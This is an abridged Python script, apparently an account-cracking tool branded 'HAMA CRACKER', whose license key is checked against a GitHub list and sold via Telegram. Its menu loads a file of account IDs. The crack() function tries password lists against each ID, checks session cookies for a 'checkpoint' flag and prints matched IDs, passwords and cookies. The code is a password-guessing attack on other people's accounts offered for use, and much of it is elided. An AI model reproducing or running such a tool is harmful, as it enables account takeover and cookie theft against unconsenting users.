...
def chk():
  ...
  print("\n\n\x1b[37;1m  KEY \033[94m"+id) 

  try: 

    httpCaht = requests.get("https://github.com/HAMAking33/HAMA_nekom/blob/main/HAMA.txt").text 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m   Barezm key kat active nya Tkaya bo Active krdn NAME bnera bo telegram @JG_HAMAE") 

      os.system('xdg-open  https://t.me/JG_HAMAE')
...
def menu():
	...
	_IPYTHONI_(f'\x1b[1;97m ☾︎ 1 ☽ ︎𝙲𝚁𝙰𝙲𝙺 𝙵𝙸𝙻𝙴 ]')
	

	_____IPYTHONI_____ = input('\x1b[1;97m DONE \x1b[1;97m ')
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			fileX = input ('\x1b[1;97m 𝙵𝙸𝙻𝙴 𝙳𝙾𝙽𝙴  ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\x1b[1;97m RANDOM ID  \x1b[1;97m'+str(len(id)))
			Settings()
		except IOError:
...
#SERVER-SETTING			
def Settings():
	print(f'\x1b[1;97m2\x1b[1;91m\x1b[1;97m 𝚁𝙰𝙽𝙳𝙾𝙼 \x1b[1;93m')
	hu = input('\x1b[1;97m 𝙳𝙾𝙽𝙴 \x1b[1;97m')
	if hu in ['1','01']:
		muda=[]
		...
		print('\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m 𝙳𝙾𝙽𝙴 ')
		exit()
	
	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m\x1b[1;97m\x1b[1;91m\x1b[1;97m 1 \x1b[1;97m 𝚁𝙰𝙽𝙳𝙾𝙼 ')
	hc = input('\x1b[1;97m 𝙳𝙾𝙽𝙴 \x1b[1;97m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input('\x1b[1;97m ☾︎ 𝙼 ☽︎ 𝚁𝙰𝙽𝙳𝙾𝙼 𝙿𝙰𝚂𝚂 \x1b[1;96m \n\x1b[1;91m\x1b[1;96m\x1b[1;97m \n\x1b[1;97m DONE \x1b[1;97m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
#	print(f"\x1b[1;97m[+] DATE : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta} ")
	...
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m CRACK COMPLETE 𝙷𝙰𝙼𝙰 CRACKER!')
...
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([hh])
	sys.stdout.write(f"\r༒︎ 𝙹𝙶❥︎𝙷𝙰𝙼𝙰 ༒︎ {P}{hh}{loop}{P} ༄𝙾𝙺 {P}{hh}{ok}{P} ༆𝙲𝙿 {P}{hh}{cp}{P} {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{hh} ༄𝙹𝙶༒𝙷𝙰𝙼𝙰  {hh}{idf}{P}𖠌{hh}{pw} {kuki}')
